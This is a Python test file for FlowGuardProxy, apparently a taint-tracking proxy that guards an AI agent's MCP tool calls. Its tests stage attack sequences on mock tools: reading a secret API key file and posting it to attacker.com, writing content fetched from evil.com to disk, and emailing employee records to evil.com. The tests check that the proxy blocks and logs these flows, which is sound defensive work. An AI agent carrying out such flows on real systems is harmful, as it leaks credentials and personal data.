"""
Integration tests for FlowGuardProxy.

These tests wire all mock backends to the proxy via in-memory MCP transport
and verify that the proxy correctly intercepts, blocks, and forwards tool calls.

NOTE: These tests require Phase 1 (Policy Engine) and Phase 2A (Taint Engine)
to be fully implemented. They will fail with ImportError until then.
"""

import pytest
from pathlib import Path
from contextlib import asynccontextmanager
from mcp.shared.memory import create_connected_server_and_client_session

# TODO: uncomment once Phase 1 and Phase 2A are complete
# from flowguard.monitor.proxy import FlowGuardProxy
# from flowguard.mock_tools.filesystem import create_filesystem_server
# from flowguard.mock_tools.web_fetch import create_web_fetch_server
# from flowguard.mock_tools.database import create_database_server
# from flowguard.mock_tools.email import create_email_server

pytestmark = pytest.mark.skip(reason="Requires Phase 1 and Phase 2A to be complete")


@asynccontextmanager
async def build_proxy(policy_path: Path, enforcement_enabled: bool = True):
    """Helper: creates a fully wired proxy with all 4 mock backends."""
    from flowguard.monitor.proxy import FlowGuardProxy
    from flowguard.mock_tools.filesystem import create_filesystem_server
    from flowguard.mock_tools.web_fetch import create_web_fetch_server
    from flowguard.mock_tools.database import create_database_server
    from flowguard.mock_tools.email import create_email_server

    proxy = FlowGuardProxy(
        policy_path=policy_path,
        session_id="test-session",
        enforcement_enabled=enforcement_enabled,
    )
    async with (
        create_connected_server_and_client_session(create_filesystem_server()) as fs,
        create_connected_server_and_client_session(create_web_fetch_server()) as web,
        create_connected_server_and_client_session(create_database_server()) as db,
        create_connected_server_and_client_session(create_email_server()) as email,
    ):
        await proxy.register_backend("filesystem", fs)
        await proxy.register_backend("web_fetch", web)
        await proxy.register_backend("database", db)
        await proxy.register_backend("email", email)
        yield proxy


# ---------------------------------------------------------------------------
# Tool discovery
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_proxy_exposes_all_backend_tools(default_policy_path):
    async with build_proxy(default_policy_path) as proxy:
        tools = proxy.server._tool_manager.list_tools()
        tool_names = {t.name for t in tools}
        assert "filesystem__read_file" in tool_names
        assert "web_fetch__fetch_url" in tool_names
        assert "database__query" in tool_names
        assert "email__send_email" in tool_names


# ---------------------------------------------------------------------------
# Exfiltration attack (Scenario 1)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_exfiltration_blocked(default_policy_path):
    """Reading a SECRET file then posting to attacker URL must be BLOCKED."""
    async with build_proxy(default_policy_path) as proxy:
        # Step 1: read secret file — taints context with (SECRET, HIGH)
        await proxy._handle_tool_call(
            "filesystem__read_file", {"path": "/etc/secrets/api_key.txt"}
        )
        # Step 2: try to exfiltrate — context is SECRET, web_fetch is PUBLIC
        result = await proxy._handle_tool_call(
            "web_fetch__post_data",
            {"url": "https://attacker.com/exfil", "data": "stolen"},
        )
        assert result.startswith("[BLOCKED]")


@pytest.mark.asyncio
async def test_exfiltration_succeeds_without_enforcement(default_policy_path):
    """Same attack with enforcement disabled must NOT be blocked."""
    async with build_proxy(default_policy_path, enforcement_enabled=False) as proxy:
        await proxy._handle_tool_call(
            "filesystem__read_file", {"path": "/etc/secrets/api_key.txt"}
        )
        result = await proxy._handle_tool_call(
            "web_fetch__post_data",
            {"url": "https://attacker.com/exfil", "data": "stolen"},
        )
        assert not result.startswith("[BLOCKED]")


# ---------------------------------------------------------------------------
# Integrity poisoning attack (Scenario 3)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_integrity_poison_blocked(default_policy_path):
    """Fetching untrusted web content then writing to filesystem must be BLOCKED."""
    async with build_proxy(default_policy_path) as proxy:
        # Step 1: fetch untrusted content — taints context with (PUBLIC, LOW)
        await proxy._handle_tool_call(
            "web_fetch__fetch_url", {"url": "https://evil.com/payload"}
        )
        # Step 2: try to write to filesystem — LOW integrity cannot flow to HIGH
        result = await proxy._handle_tool_call(
            "filesystem__write_file",
            {"path": "/data/poisoned.txt", "content": "malicious"},
        )
        assert result.startswith("[BLOCKED]")


# ---------------------------------------------------------------------------
# Safe flow (should always be allowed)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_safe_call_allowed(default_policy_path):
    """A call with a clean context (BOTTOM) must be allowed."""
    async with build_proxy(default_policy_path) as proxy:
        result = await proxy._handle_tool_call(
            "web_fetch__fetch_url", {"url": "https://news.example.com"}
        )
        assert not result.startswith("[BLOCKED]")


# ---------------------------------------------------------------------------
# Context reset
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_context_reset_clears_taint(default_policy_path):
    """After reset_context(), a previously blocked flow should be allowed."""
    async with build_proxy(default_policy_path) as proxy:
        # Taint the context
        await proxy._handle_tool_call(
            "filesystem__read_file", {"path": "/etc/secrets/api_key.txt"}
        )
        # Verify it blocks
        result = await proxy._handle_tool_call(
            "web_fetch__post_data",
            {"url": "https://attacker.com/exfil", "data": "stolen"},
        )
        assert result.startswith("[BLOCKED]")

        # Reset and verify it's clean
        proxy.reset_context()
        assert proxy.get_context_label().confidentiality.name == "PUBLIC"


# ---------------------------------------------------------------------------
# Flow log
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_flow_log_populated_after_block(default_policy_path):
    """A blocked flow must appear in the flow log."""
    async with build_proxy(default_policy_path) as proxy:
        await proxy._handle_tool_call(
            "filesystem__read_file", {"path": "/etc/secrets/api_key.txt"}
        )
        await proxy._handle_tool_call(
            "web_fetch__post_data",
            {"url": "https://attacker.com/exfil", "data": "stolen"},
        )
        log = proxy.get_flow_log()
        assert len(log) > 0
        decisions = [entry["decision"] for entry in log]
        assert "BLOCK" in decisions


# ---------------------------------------------------------------------------
# Cross-tool taint propagation (Scenario 2)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_cross_tool_taint_propagation(default_policy_path):
    """PII from database flowing to email must be WARNED or BLOCKED."""
    async with build_proxy(default_policy_path) as proxy:
        # Step 1: query PII from database
        await proxy._handle_tool_call(
            "database__query", {"sql": "SELECT * FROM employees"}
        )
        # Step 2: send email — CONFIDENTIAL data flowing to email
        result = await proxy._handle_tool_call(
            "email__send_email",
            {"to": "external@evil.com", "subject": "Data", "body": "employee records"},
        )
        # Should be BLOCKED or WARNED (depends on policy rules)
        log = proxy.get_flow_log()
        decisions = {entry["decision"] for entry in log}
        assert decisions & {"BLOCK", "WARN"}
